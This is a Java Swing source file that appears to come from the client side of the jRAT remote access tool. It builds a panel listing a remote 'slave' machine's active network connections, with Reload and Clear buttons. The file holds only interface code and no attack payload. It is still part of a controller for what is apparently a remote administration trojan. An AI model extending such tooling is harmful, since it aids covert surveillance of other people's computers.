package io.jrat.client.ui.panels;

import io.jrat.client.Slave;
import io.jrat.client.packets.outgoing.Packet73ActivePorts;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;


@SuppressWarnings("serial")
public class PanelControlActivePorts extends PanelControlParent {

	private JTable table;
	private DefaultTableModel model;

	public DefaultTableModel getModel() {
		return model;
	}

	public PanelControlActivePorts(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.setIcon(new ImageIcon(PanelControlActivePorts.class.getResource("/icons/update.png")));
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				slave.addToSendQueue(new Packet73ActivePorts());
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.setIcon(new ImageIcon(PanelControlActivePorts.class.getResource("/icons/clear.png")));
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear).addContainerGap(430, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 298, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addGap(18)));

		table = new JTable();
		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Protocol", "Local address", "External address", "Status" }));
		table.getColumnModel().getColumn(1).setPreferredWidth(168);
		table.getColumnModel().getColumn(2).setPreferredWidth(225);
		table.getColumnModel().getColumn(3).setPreferredWidth(116);
		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}
}
